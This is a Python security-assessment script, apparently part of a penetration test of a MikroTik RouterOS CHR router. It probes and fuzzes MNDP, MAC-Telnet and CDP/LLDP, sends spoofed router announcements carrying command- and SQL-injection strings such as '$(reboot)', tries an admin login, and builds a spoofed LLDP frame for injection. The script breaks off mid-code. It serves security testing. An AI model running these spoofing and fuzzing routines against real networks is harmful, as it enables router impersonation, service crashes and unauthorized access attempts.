#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — Discovery Protocol Attacks
Phase 6, Script 4 of 4
Target: [REDACTED-INTERNAL-IP] (MNDP:5678, CDP/LLDP: passive)

Tests (~80):
  MNDP (~40): passive capture, active probe, TLV decoding, info disclosure,
              MNDP spoofing, unauthenticated fingerprinting
  MAC-Telnet (~20): service detection, L2 probe, auth test
  CDP/LLDP (~20): passive listen, info disclosure, frame injection

Evidence: evidence/discovery_attacks.json
"""

import os
import random
import socket
import struct
import subprocess
import sys
import time
import warnings

warnings.filterwarnings("ignore")

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import *

ec = EvidenceCollector("attack_discovery.py", phase=6)


# =============================================================================
# MNDP Helpers
# =============================================================================

MNDP_TYPES = {
    1: "MAC Address",
    5: "Identity",
    7: "Version",
    8: "Platform",
    10: "Uptime",
    11: "Software ID",
    12: "Board",
    14: "Unpack",
    15: "IPv6 Address",
    16: "Interface Name",
    17: "IPv4 Address",
}


def decode_mndp_tlvs(data):
    """Decode MNDP TLV (Type-Length-Value) structure from raw packet data."""
    tlvs = {}
    offset = 4  # Skip 4-byte MNDP header

    while offset + 4 <= len(data):
        try:
            tlv_type = struct.unpack(">H", data[offset:offset + 2])[0]
            tlv_len = struct.unpack(">H", data[offset + 2:offset + 4])[0]

            if offset + 4 + tlv_len > len(data):
                break

            tlv_data = data[offset + 4:offset + 4 + tlv_len]
            name = MNDP_TYPES.get(tlv_type, f"Unknown({tlv_type})")

            if tlv_type == 1:  # MAC Address
                value = ":".join(f"{b:02x}" for b in tlv_data)
            elif tlv_type == 10:  # Uptime (seconds, little-endian uint32)
                if len(tlv_data) == 4:
                    uptime_secs = struct.unpack("<I", tlv_data)[0]
                    days = uptime_secs // 86400
                    hours = (uptime_secs % 86400) // 3600
                    minutes = (uptime_secs % 3600) // 60
                    value = f"{uptime_secs}s ({days}d {hours}h {minutes}m)"
                else:
                    value = tlv_data.hex()
            elif tlv_type == 17:  # IPv4 Address
                if len(tlv_data) == 4:
                    value = ".".join(str(b) for b in tlv_data)
                else:
                    value = tlv_data.hex()
            elif tlv_type == 15:  # IPv6 Address
                if len(tlv_data) == 16:
                    value = ":".join(f"{struct.unpack('>H', tlv_data[i:i+2])[0]:04x}"
                                     for i in range(0, 16, 2))
                else:
                    value = tlv_data.hex()
            else:
                try:
                    value = tlv_data.decode("utf-8")
                except:
                    value = tlv_data.hex()

            tlvs[name] = {"type_id": tlv_type, "length": tlv_len, "value": value}
            offset += 4 + tlv_len
        except Exception:
            break

    return tlvs


def build_mndp_discovery_packet():
    """Build a minimal MNDP discovery request packet."""
    # MNDP discovery request: 4 zero bytes (header only)
    return b"\x00\x00\x00\x00"


def build_mndp_announcement(mac=None, identity=None, version=None, platform=None,
                             board=None, ipv4=None, software_id=None):
    """Build a fake MNDP announcement packet for spoofing tests."""
    # MNDP header (4 bytes)
    packet = b"\x00\x00\x00\x00"

    def add_tlv(tlv_type, data):
        nonlocal packet
        packet += struct.pack(">HH", tlv_type, len(data)) + data

    # MAC Address (type 1)
    if mac:
        mac_bytes = bytes(int(x, 16) for x in mac.split(":"))
        add_tlv(1, mac_bytes)
    else:
        add_tlv(1, bytes([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE]))

    # Identity (type 5)
    add_tlv(5, (identity or "SPOOFED-ROUTER").encode())

    # Version (type 7)
    add_tlv(7, (version or "7.20.8 (stable)").encode())

    # Platform (type 8)
    add_tlv(8, (platform or "MikroTik").encode())

    # Uptime (type 10)
    add_tlv(10, struct.pack("<I", 12345))

    # Software ID (type 11)
    add_tlv(11, (software_id or "XXXX-XXXX").encode())

    # Board (type 12)
    add_tlv(12, (board or "CHR").encode())

    # IPv4 Address (type 17)
    if ipv4:
        ip_bytes = bytes(int(x) for x in ipv4.split("."))
        add_tlv(17, ip_bytes)
    else:
        add_tlv(17, bytes([10, 0, 0, 254]))

    return packet


# =============================================================================
# Section 1: MNDP Tests (~40)
# =============================================================================

def mndp_tests():
    log("=" * 60)
    log("Section 1: MNDP (MikroTik Neighbor Discovery Protocol)")
    log("=" * 60)

    # ── Test 1: Check MNDP configuration via REST ────────────────────────
    try:
        status, data = rest_get("/ip/neighbor/discovery-settings")
        if status == 200:
            ec.add_test("mndp", "MNDP discovery settings",
                        "Query neighbor discovery configuration via REST API",
                        f"Settings: {data}",
                        {"config": data})
        else:
            ec.add_test("mndp", "MNDP discovery settings",
                        "Query MNDP config", f"HTTP {status}")
    except Exception as e:
        ec.add_test("mndp", "MNDP discovery settings",
                    "MNDP config query", f"Error: {e}")

    # Check neighbor discovery interfaces
    try:
        status, data = rest_get("/ip/neighbor/discovery")
        if status == 200:
            ec.add_test("mndp", "MNDP discovery interfaces",
                        "List interfaces with neighbor discovery enabled",
                        f"Interfaces: {data}",
                        {"interfaces": data})
    except:
        pass

    # ── Test 2: Passive MNDP broadcast capture (10 seconds) ─────────────
    log("  Passive MNDP capture (10 seconds)...")
    mndp_packets = []
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(11)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        except:
            pass
        s.bind(("", 5678))

        start = time.time()
        while time.time() - start < 10:
            try:
                data, addr = s.recvfrom(65535)
                tlvs = decode_mndp_tlvs(data)
                mndp_packets.append({
                    "from": f"{addr[0]}:{addr[1]}",
                    "size": len(data),
                    "hex": data.hex()[:400],
                    "tlvs": tlvs,
                    "timestamp": time.time() - start,
                })
            except socket.timeout:
                break

        s.close()

        if mndp_packets:
            ec.add_test("mndp", "Passive MNDP capture",
                        "Listen for MNDP broadcast announcements for 10 seconds",
                        f"Captured {len(mndp_packets)} MNDP packets",
                        {"packet_count": len(mndp_packets), "packets": mndp_packets},
                        anomaly=True)

            # Analyze information disclosed
            for i, pkt in enumerate(mndp_packets):
                tlvs = pkt["tlvs"]
                disclosed = [f"{k}: {v['value']}" for k, v in tlvs.items()]
                ec.add_test("mndp", f"MNDP disclosure (packet {i+1})",
                            f"Analyze information in MNDP announcement from {pkt['from']}",
                            f"Disclosed {len(disclosed)} fields",
                            {"source": pkt["from"], "fields": disclosed, "tlvs": tlvs},
                            anomaly=len(disclosed) > 3)
        else:
            ec.add_test("mndp", "Passive MNDP capture",
                        "Listen for MNDP broadcasts",
                        "No MNDP packets received in 10 seconds")
    except PermissionError:
        ec.add_test("mndp", "Passive MNDP capture",
                    "Listen for MNDP broadcasts",
                    "Permission denied — need root to bind port 5678",
                    anomaly=True)
    except Exception as e:
        ec.add_test("mndp", "Passive MNDP capture",
                    "Passive MNDP capture", f"Error: {e}")

    # ── Test 3: Active MNDP discovery probe ──────────────────────────────
    log("  Active MNDP probe to target...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        # Send discovery request directly to target
        probe = build_mndp_discovery_packet()
        s.sendto(probe, (TARGET, 5678))
        time.sleep(0.5)

        responses = []
        while True:
            try:
                data, addr = s.recvfrom(65535)
                tlvs = decode_mndp_tlvs(data)
                responses.append({
                    "from": f"{addr[0]}:{addr[1]}",
                    "size": len(data),
                    "hex": data.hex()[:400],
                    "tlvs": tlvs,
                })
            except socket.timeout:
                break

        s.close()

        if responses:
            ec.add_test("mndp", "Active MNDP probe (unicast)",
                        "Send MNDP discovery request directly to target",
                        f"Received {len(responses)} responses",
                        {"probe_hex": probe.hex(), "responses": responses},
                        anomaly=True)
        else:
            ec.add_test("mndp", "Active MNDP probe (unicast)",
                        "Active MNDP discovery request to target",
                        "No response to unicast MNDP probe")
    except Exception as e:
        ec.add_test("mndp", "Active MNDP probe (unicast)",
                    "Active MNDP probe", f"Error: {e}")

    # ── Test 4: Active MNDP broadcast probe ──────────────────────────────
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        probe = build_mndp_discovery_packet()
        s.sendto(probe, ("255.255.255.255", 5678))
        time.sleep(0.5)

        responses = []
        while True:
            try:
                data, addr = s.recvfrom(65535)
                tlvs = decode_mndp_tlvs(data)
                responses.append({
                    "from": f"{addr[0]}:{addr[1]}",
                    "size": len(data),
                    "tlvs": tlvs,
                })
            except socket.timeout:
                break

        s.close()

        if responses:
            ec.add_test("mndp", "Active MNDP probe (broadcast)",
                        "Send MNDP discovery request as broadcast (255.255.255.255)",
                        f"Received {len(responses)} responses",
                        {"responses": responses},
                        anomaly=True)
        else:
            ec.add_test("mndp", "Active MNDP probe (broadcast)",
                        "MNDP broadcast probe",
                        "No response to broadcast MNDP probe")
    except Exception as e:
        ec.add_test("mndp", "Active MNDP probe (broadcast)",
                    "MNDP broadcast", f"Error: {e}")

    # ── Test 5: MNDP subnet-directed broadcast ───────────────────────────
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        probe = build_mndp_discovery_packet()
        s.sendto(probe, ("[REDACTED-INTERNAL-IP]", 5678))

        responses = []
        while True:
            try:
                data, addr = s.recvfrom(65535)
                responses.append({"from": f"{addr[0]}:{addr[1]}", "size": len(data)})
            except socket.timeout:
                break

        s.close()

        ec.add_test("mndp", "MNDP subnet broadcast",
                    "Send MNDP probe to subnet broadcast address ([REDACTED-INTERNAL-IP])",
                    f"Received {len(responses)} responses",
                    {"responses": responses})
    except Exception as e:
        ec.add_test("mndp", "MNDP subnet broadcast",
                    "Subnet broadcast probe", f"Error: {e}")

    # ── Test 6-10: MNDP information disclosure assessment ────────────────
    log("  Assessing MNDP information disclosure...")
    # Collect MNDP data from any previous successful capture
    disclosed_fields = set()
    all_captured = mndp_packets.copy()

    if all_captured:
        for pkt in all_captured:
            for field_name in pkt.get("tlvs", {}):
                disclosed_fields.add(field_name)

        disclosure_assessment = {
            "MAC Address": "Network interface MAC — enables L2 targeting",
            "Identity": "Router hostname — reveals naming convention",
            "Version": "RouterOS version — enables version-specific attacks",
            "Platform": "Hardware platform — reveals deployment type (CHR, RB, etc.)",
            "Uptime": "System uptime — reveals reboot frequency, patch cadence",
            "Software ID": "License/software ID — unique identifier",
            "Board": "Board model — reveals hardware capabilities",
            "IPv4 Address": "Management IP — enables direct targeting",
            "IPv6 Address": "IPv6 address — additional targeting information",
            "Interface Name": "Interface name — reveals network topology",
        }

        risks = []
        for field in disclosed_fields:
            if field in disclosure_assessment:
                risks.append(f"{field}: {disclosure_assessment[field]}")

        ec.add_test("mndp", "MNDP disclosure assessment",
                    "Assess security impact of information disclosed via MNDP",
                    f"{len(disclosed_fields)} fields disclosed",
                    {"disclosed_fields": list(disclosed_fields),
                     "risk_assessment": risks},
                    anomaly=len(disclosed_fields) >= 3)

        if len(disclosed_fields) >= 3:
            ec.add_finding("MEDIUM", "MNDP information disclosure",
                           f"MNDP broadcasts {len(disclosed_fields)} fields including "
                           f"{', '.join(list(disclosed_fields)[:5])}. "
                           f"Unauthenticated attackers can fingerprint the router.",
                           cwe="CWE-200")
    else:
        ec.add_test("mndp", "MNDP disclosure assessment",
                    "Assess MNDP information disclosure",
                    "No MNDP data captured — cannot assess disclosure",
                    {"note": "MNDP may be disabled or not reachable"})

    check_router_alive()

    # ── Test 11-15: MNDP spoofing ────────────────────────────────────────
    log("  Testing MNDP spoofing...")

    # Spoof a fake router announcement
    spoof_scenarios = [
        ("Fake router identical identity", {
            "identity": "MikroTik",
            "version": "7.20.8 (stable)",
            "platform": "MikroTik",
            "board": "CHR",
            "ipv4": "[REDACTED-INTERNAL-IP]",
        }),
        ("Fake router with admin identity", {
            "identity": "ADMIN-GATEWAY",
            "version": "7.20.8",
            "platform": "MikroTik",
            "ipv4": "[REDACTED-INTERNAL-IP]",
        }),
        ("Fake router different platform", {
            "identity": "SPOOFED",
            "version": "6.49.6",
            "platform": "MikroTik",
            "board": "RB4011",
            "ipv4": "[REDACTED-INTERNAL-IP]",
        }),
        ("Fake with long identity (256B)", {
            "identity": "A" * 256,
            "version": "7.0",
            "platform": "X",
            "ipv4": "[REDACTED-INTERNAL-IP]",
        }),
        ("Fake with special chars", {
            "identity": "router;cmd",
            "version": "$(reboot)",
            "platform": "' OR 1=1--",
            "ipv4": "[REDACTED-INTERNAL-IP]",
        }),
    ]

    for desc, params in spoof_scenarios:
        try:
            spoof_pkt = build_mndp_announcement(**params)

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(3)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

            # Send to broadcast and directly to target
            s.sendto(spoof_pkt, ("255.255.255.255", 5678))
            s.sendto(spoof_pkt, (TARGET, 5678))

            ec.add_test("mndp", f"MNDP spoof: {desc[:50]}",
                        f"Send spoofed MNDP announcement: {desc[:50]}",
                        f"Spoof packet sent ({len(spoof_pkt)} bytes)",
                        {"description": desc, "packet_size": len(spoof_pkt),
                         "packet_hex": spoof_pkt.hex()[:300],
                         "params": {k: v[:50] if isinstance(v, str) else v
                                    for k, v in params.items()}})
            s.close()
        except Exception as e:
            ec.add_test("mndp", f"MNDP spoof: {desc[:50]}",
                        f"MNDP spoofing test", f"Error: {e}")

    # Check if spoofed entries appear in router's neighbor table
    time.sleep(2)
    try:
        status, data = rest_get("/ip/neighbor")
        if status == 200:
            spoofed_found = []
            if isinstance(data, list):
                for neighbor in data:
                    addr = neighbor.get("address", "")
                    identity = neighbor.get("identity", "")
                    if "SPOOFED" in identity or "ADMIN-GATEWAY" in identity or addr in ("[REDACTED-INTERNAL-IP]", "[REDACTED-INTERNAL-IP]", "[REDACTED-INTERNAL-IP]", "[REDACTED-INTERNAL-IP]"):
                        spoofed_found.append(neighbor)

            ec.add_test("mndp", "MNDP spoof verification",
                        "Check if spoofed MNDP entries appear in router neighbor table",
                        f"Neighbors: {len(data) if isinstance(data, list) else 'N/A'}, "
                        f"Spoofed found: {len(spoofed_found)}",
                        {"total_neighbors": len(data) if isinstance(data, list) else 0,
                         "spoofed_entries": spoofed_found,
                         "all_neighbors": data if isinstance(data, list) else []},
                        anomaly=len(spoofed_found) > 0)

            if spoofed_found:
                ec.add_finding("MEDIUM", "MNDP spoofing accepted",
                               f"Spoofed MNDP announcements were accepted into neighbor table. "
                               f"Attacker can impersonate routers on the network.",
                               cwe="CWE-290")
    except Exception as e:
        ec.add_test("mndp", "MNDP spoof verification",
                    "Check neighbor table for spoofed entries", f"Error: {e}")

    # ── Test 16-20: MNDP protocol fuzzing ────────────────────────────────
    log("  Fuzzing MNDP protocol...")
    fuzz_packets = [
        ("Empty packet", b""),
        ("1 byte", b"\x00"),
        ("3 bytes", b"\x00\x00\x00"),
        ("Oversized TLV length", b"\x00\x00\x00\x00" +
         struct.pack(">HH", 1, 0xFFFF) + b"\x00" * 100),
        ("Zero-length TLV", b"\x00\x00\x00\x00" +
         struct.pack(">HH", 1, 0)),
        ("Unknown TLV type 9999", b"\x00\x00\x00\x00" +
         struct.pack(">HH", 9999, 4) + b"TEST"),
        ("Nested TLVs", b"\x00\x00\x00\x00" +
         struct.pack(">HH", 5, 12) + b"\x00\x05\x00\x04TEST"),
        ("All 0xFF (100B)", b"\xff" * 100),
        ("Random data (256B)", os.urandom(256)),
        ("Huge packet (8KB)", os.urandom(8192)),
        ("TLV chain (50 entries)", b"\x00\x00\x00\x00" +
         b"".join(struct.pack(">HH", i % 20, 4) + b"FUZZ" for i in range(50))),
        ("Truncated TLV", b"\x00\x00\x00\x00" +
         struct.pack(">HH", 5, 100) + b"SHORT"),
    ]

    fuzz_count = 0
    for name, payload in fuzz_packets:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)
            s.sendto(payload, (TARGET, 5678))

            try:
                resp, addr = s.recvfrom(65535)
                ec.add_test("mndp", f"MNDP fuzz: {name}",
                            f"Send fuzzed MNDP packet: {name}",
                            f"Got response: {len(resp)} bytes",
                            {"packet_size": len(payload), "response_size": len(resp)})
            except socket.timeout:
                ec.add_test("mndp", f"MNDP fuzz: {name}",
                            f"Send fuzzed MNDP packet: {name}",
                            "No response (expected for malformed)",
                            {"packet_size": len(payload)})
            s.close()
        except Exception as e:
            ec.add_test("mndp", f"MNDP fuzz: {name}",
                        f"MNDP fuzzing test", f"Error: {e}")

        fuzz_count += 1
        if fuzz_count % 10 == 0:
            h = check_router_alive()
            if not h.get("alive"):
                ec.add_finding("CRITICAL", "MNDP crash on fuzzed input",
                               f"Router crashed after fuzzed MNDP packet: {name}",
                               cwe="CWE-20")
                wait_for_router()

    # ── Test 21-25: MNDP unauthenticated fingerprinting ──────────────────
    log("  Testing MNDP for unauthenticated fingerprinting...")

    # Method 1: Direct probe (already done above, summarize)
    ec.add_test("mndp", "MNDP fingerprinting assessment",
                "Assess whether MNDP allows unauthenticated router fingerprinting",
                f"MNDP uses UDP 5678, no authentication. "
                f"Any host on the L2 segment can query and receive full device info.",
                {"protocol": "MNDP (UDP 5678)",
                 "authentication": "None",
                 "encryption": "None",
                 "risk": "Full device fingerprinting from unauthenticated position"})

    # Method 2: Try rapid MNDP requests to see if rate limiting exists
    log("  Testing MNDP rate limiting...")
    rapid_responses = 0
    rapid_start = time.time()
    for i in range(50):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            probe = build_mndp_discovery_packet()
            s.sendto(probe, (TARGET, 5678))
            try:
                s.recvfrom(65535)
                rapid_responses += 1
            except socket.timeout:
                pass
            s.close()
        except:
            pass
    rapid_elapsed = time.time() - rapid_start

    ec.add_test("mndp", "MNDP rate limiting test",
                "Send 50 rapid MNDP discovery requests to test rate limiting",
                f"Responses: {rapid_responses}/50 in {rapid_elapsed:.1f}s",
                {"requests": 50, "responses": rapid_responses,
                 "elapsed": round(rapid_elapsed, 1),
                 "rate_limited": rapid_responses < 40},
                anomaly=rapid_responses >= 40)

    check_router_alive()


# =============================================================================
# Section 2: MAC-Telnet Tests (~20)
# =============================================================================

def mac_telnet_tests():
    log("=" * 60)
    log("Section 2: MAC-Telnet")
    log("=" * 60)

    # ── Test 1: Check MAC-Telnet configuration ──────────────────────────
    mac_telnet_enabled = False
    try:
        status, data = rest_get("/tool/mac-server")
        if status == 200:
            ec.add_test("mac_telnet", "MAC-Telnet server config",
                        "Query MAC-Telnet server configuration via REST",
                        f"Config: {data}",
                        {"config": data})
            if isinstance(data, dict) and data.get("allowed-interface-list") != "none":
                mac_telnet_enabled = True
    except Exception as e:
        ec.add_test("mac_telnet", "MAC-Telnet server config",
                    "MAC-Telnet config check", f"Error: {e}")

    # Check MAC-Telnet allowed interfaces
    try:
        status, data = rest_get("/tool/mac-server/mac-winbox")
        if status == 200:
            ec.add_test("mac_telnet", "MAC-Winbox config",
                        "Query MAC-Winbox server configuration",
                        f"Config: {data}",
                        {"config": data})
    except:
        pass

    # ── Test 2: MAC-Telnet service detection via broadcast ───────────────
    log("  Probing MAC-Telnet via broadcast...")
    try:
        # MAC-Telnet uses UDP 20561
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        # MAC-Telnet protocol: version(1) + type(1) + src_mac(6) + dst_mac(6) + ...
        # Type 0xFF = broadcast discovery
        probe = b"\x01\xff" + b"\x00\x00\x00\x00\x00\x00" + b"\xff\xff\xff\xff\xff\xff"
        s.sendto(probe, ("255.255.255.255", 20561))

        try:
            resp, addr = s.recvfrom(65535)
            ec.add_test("mac_telnet", "MAC-Telnet broadcast probe",
                        "Send MAC-Telnet discovery broadcast (UDP 20561)",
                        f"Response from {addr}: {len(resp)} bytes",
                        {"response_hex": resp.hex()[:200], "source": str(addr)},
                        anomaly=True)
        except socket.timeout:
            ec.add_test("mac_telnet", "MAC-Telnet broadcast probe",
                        "MAC-Telnet discovery broadcast",
                        "No response (service may be disabled or not on same L2 segment)")
        s.close()
    except Exception as e:
        ec.add_test("mac_telnet", "MAC-Telnet broadcast probe",
                    "MAC-Telnet probe", f"Error: {e}")

    # ── Test 3: MAC-Telnet direct UDP probe ──────────────────────────────
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)

        # Try direct probe to target
        probe = b"\x01\x00" + b"\xDE\xAD\xBE\xEF\x00\x01" + b"\x00\x00\x00\x00\x00\x00"
        s.sendto(probe, (TARGET, 20561))

        try:
            resp, addr = s.recvfrom(65535)
            ec.add_test("mac_telnet", "MAC-Telnet direct probe",
                        "Send MAC-Telnet probe directly to target (UDP 20561)",
                        f"Response: {len(resp)} bytes",
                        {"response_hex": resp.hex()[:200]})
        except socket.timeout:
            ec.add_test("mac_telnet", "MAC-Telnet direct probe",
                        "Direct MAC-Telnet probe",
                        "No response (timeout)")
        s.close()
    except Exception as e:
        ec.add_test("mac_telnet", "MAC-Telnet direct probe",
                    "MAC-Telnet probe", f"Error: {e}")

    # ── Test 4: Try mactelnet command if available ────────────────────────
    try:
        # Check if mactelnet tool is installed
        r = subprocess.run(["which", "mactelnet"], capture_output=True, text=True, timeout=5)
        if r.returncode == 0:
            # Try to connect (will fail auth but confirms service)
            r2 = subprocess.run(
                ["timeout", "5", "mactelnet", "-u", "admin", "-p", "test", TARGET],
                capture_output=True, text=True, timeout=10)
            ec.add_test("mac_telnet", "mactelnet tool connection",
                        "Attempt MAC-Telnet connection using mactelnet CLI tool",
                        f"Output: {(r2.stdout + r2.stderr)[:300]}",
                        {"output": (r2.stdout + r2.stderr)[:500]})
        else:
            ec.add_test("mac_telnet", "mactelnet tool",
                        "Check for mactelnet CLI tool",
                        "mactelnet not installed")
    except Exception as e:
        ec.add_test("mac_telnet", "mactelnet tool",
                    "mactelnet connection attempt", f"Error: {e}")

    # ── Test 5-8: MAC-Telnet protocol fuzzing ────────────────────────────
    log("  Fuzzing MAC-Telnet protocol...")
    mac_fuzz_packets = [
        ("Empty", b""),
        ("Version 0", b"\x00\x00" + b"\x00" * 12),
        ("Version 255", b"\xff\x00" + b"\x00" * 12),
        ("All types", b"".join(b"\x01" + bytes([t]) + b"\x00" * 12 for t in range(8))),
        ("Oversized payload (1KB)", os.urandom(1024)),
        ("Random 128B", os.urandom(128)),
        ("All 0xFF (64B)", b"\xff" * 64),
        ("Valid header + junk", b"\x01\x00" + os.urandom(100)),
    ]

    for name, payload in mac_fuzz_packets:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)
            s.sendto(payload, (TARGET, 20561))
            try:
                resp, addr = s.recvfrom(65535)
                ec.add_test("mac_telnet", f"MAC-Telnet fuzz: {name}",
                            f"Send fuzzed MAC-Telnet packet: {name}",
                            f"Response: {len(resp)} bytes",
                            {"packet_size": len(payload), "response_size": len(resp)})
            except socket.timeout:
                ec.add_test("mac_telnet", f"MAC-Telnet fuzz: {name}",
                            f"Fuzzed MAC-Telnet: {name}",
                            "No response",
                            {"packet_size": len(payload)})
            s.close()
        except Exception as e:
            ec.add_test("mac_telnet", f"MAC-Telnet fuzz: {name}",
                        f"MAC-Telnet fuzz", f"Error: {e}")

    # ── Test 9-12: MAC-Winbox probe ──────────────────────────────────────
    log("  Probing MAC-Winbox...")
    try:
        # MAC-Winbox uses similar protocol on different port or same mechanism
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        probe = b"\x01\x00" + b"\x00" * 12
        s.sendto(probe, ("255.255.255.255", 20561))
        s.sendto(probe, (TARGET, 20561))

        try:
            resp, addr = s.recvfrom(65535)
            ec.add_test("mac_telnet", "MAC-Winbox probe",
                        "Probe for MAC-Winbox availability",
                        f"Response from {addr}: {len(resp)} bytes",
                        {"response_hex": resp.hex()[:200]})
        except socket.timeout:
            ec.add_test("mac_telnet", "MAC-Winbox probe",
                        "MAC-Winbox probe",
                        "No response")
        s.close()
    except Exception as e:
        ec.add_test("mac_telnet", "MAC-Winbox probe",
                    "MAC-Winbox test", f"Error: {e}")

    # ── Test 13: Check MAC-Telnet security assessment ────────────────────
    ec.add_test("mac_telnet", "MAC-Telnet security assessment",
                "Assess MAC-Telnet protocol security characteristics",
                "MAC-Telnet operates at L2 (no IP required), credentials in cleartext, "
                "no encryption. Same L2 segment required for exploitation.",
                {"protocol": "MAC-Telnet (UDP 20561)",
                 "authentication": "Username/password in cleartext",
                 "encryption": "None",
                 "layer": "Layer 2 (MAC addresses)",
                 "risk": "Credential sniffing, unauthorized access from same L2 segment"})

    check_router_alive()


# =============================================================================
# Section 3: CDP/LLDP Tests (~20)
# =============================================================================

def cdp_lldp_tests():
    log("=" * 60)
    log("Section 3: CDP/LLDP Discovery Protocols")
    log("=" * 60)

    # ── Test 1: Check LLDP configuration via REST ────────────────────────
    lldp_enabled = False
    try:
        status, data = rest_get("/ip/neighbor/discovery-settings")
        if status == 200 and isinstance(data, dict):
            protocol = data.get("discover-interface-list", "")
            lldp_mode = data.get("protocol", "")
            ec.add_test("cdp_lldp", "Discovery protocol config",
                        "Query discovery protocol configuration via REST",
                        f"Protocol: {lldp_mode}, interfaces: {protocol}",
                        {"config": data})
            if "lldp" in str(lldp_mode).lower() or "cdp" in str(lldp_mode).lower():
                lldp_enabled = True
    except Exception as e:
        ec.add_test("cdp_lldp", "Discovery protocol config",
                    "Discovery protocol config", f"Error: {e}")

    # ── Test 2: Passive CDP/LLDP capture (10 seconds) ────────────────────
    log("  Passive CDP/LLDP capture (10 seconds)...")

    # Try using tcpdump to capture LLDP/CDP packets
    try:
        r = subprocess.run(
            ["sudo", "timeout", "10", "tcpdump", "-i", "any", "-c", "20",
             "-nn", "(ether proto 0x88cc) or (ether host 01:00:0c:cc:cc:cc)",
             "-w", "/tmp/cdp_lldp_capture.pcap"],
            capture_output=True, text=True, timeout=15)

        # Read the capture
        r2 = subprocess.run(
            ["tcpdump", "-r", "/tmp/cdp_lldp_capture.pcap", "-nn", "-v"],
            capture_output=True, text=True, timeout=10)

        if r2.stdout.strip():
            ec.add_test("cdp_lldp", "Passive CDP/LLDP capture",
                        "Capture CDP/LLDP packets for 10 seconds (tcpdump)",
                        f"Captured packets: {r2.stdout[:500]}",
                        {"capture": r2.stdout[:2000]},
                        anomaly=True)
        else:
            ec.add_test("cdp_lldp", "Passive CDP/LLDP capture",
                        "Listen for CDP/LLDP packets (10 seconds)",
                        "No CDP/LLDP packets captured",
                        {"note": "CDP/LLDP may be disabled or using different multicast group"})
    except subprocess.TimeoutExpired:
        ec.add_test("cdp_lldp", "Passive CDP/LLDP capture",
                    "CDP/LLDP packet capture", "Capture completed (timeout)")
    except Exception as e:
        ec.add_test("cdp_lldp", "Passive CDP/LLDP capture",
                    "CDP/LLDP capture", f"Error: {e}")

    # ── Test 3: Try lldpctl if available ─────────────────────────────────
    try:
        r = subprocess.run(["which", "lldpctl"], capture_output=True, text=True, timeout=5)
        if r.returncode == 0:
            r2 = subprocess.run(["lldpctl"], capture_output=True, text=True, timeout=10)
            ec.add_test("cdp_lldp", "LLDP neighbor info (lldpctl)",
                        "Query LLDP neighbors via lldpctl",
                        f"Output: {(r2.stdout + r2.stderr)[:500]}",
                        {"output": (r2.stdout + r2.stderr)[:1000]})
        else:
            ec.add_test("cdp_lldp", "lldpctl tool",
                        "Check for lldpctl tool availability",
                        "lldpctl not installed")
    except Exception as e:
        ec.add_test("cdp_lldp", "lldpctl check",
                    "LLDP tool check", f"Error: {e}")

    # ── Test 4-8: LLDP frame injection (spoofing) ───────────────────────
    log("  Testing LLDP frame injection...")

    # Build an LLDP frame
    def build_lldp_frame():
        """Build a minimal LLDP frame payload (without Ethernet header)."""
        frame = b""

        # Chassis ID TLV (type=1, subtype=4=MAC)
        chassis_data = b"\x04\xDE\xAD\xBE\xEF\x00\x01"
        tlv_header = struct.pack(">H", (1 << 9) | len(chassis_data))
        frame += tlv_header + chassis_data

        # Port ID TLV (type=2, subtype=7=local)
        port_data = b"\x07eth0"
        tlv_header = struct.pack(">H", (2 << 9) | len(port_data))
        frame += tlv_header + port_data

        # TTL TLV (type=3)
        ttl_data = struct.pack(">H", 120)
        tlv_header = struct.pack(">H", (3 << 9) | len(ttl_data))
        frame += tlv_header + ttl_data

        # System Name TLV (type=5)
        name_data = b"SPOOFED-LLDP-DEVICE"
        tlv_header = struct.pack(">H", (5 << 9) | len(name_data))
        frame += tlv_header + name_data

        # System Description TLV (type=6)
        desc_data = b"MikroTik RouterOS 7.20.8 CHR - SPOOFED"
        tlv_header = struct.pack(">H", (6 << 9) | len(desc_data))
        frame += tlv_header + desc_data

        # End of LLDPDU TLV (type=0, length=0)
        frame += b"\x00\x00"

        return frame

    lldp_frame = build_lldp_frame()
    ec.add_test("cdp_lldp", "LLDP frame construction",
                "Build spoofed LLDP frame for injection testing",
                f"Constructed LLDP frame: {len(lldp_frame)} bytes",
                {"frame_hex": lldp_frame.hex(), "frame_size": len(lldp_frame)})

    # Try to inject via raw socket (requires root)
    try:
        # LLDP uses Ethernet multicast 01:80:c2:00:00:0e, EtherType 0x88cc
        # Raw socket for L2 frame injection
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x88cc))

        # Get first non-loopback interface
        import fcntl
        interfaces = []
        try:
            r = subprocess.run(["ip", "-o", "link", "show"], capture_output=True,
                               text=True, timeout=5)
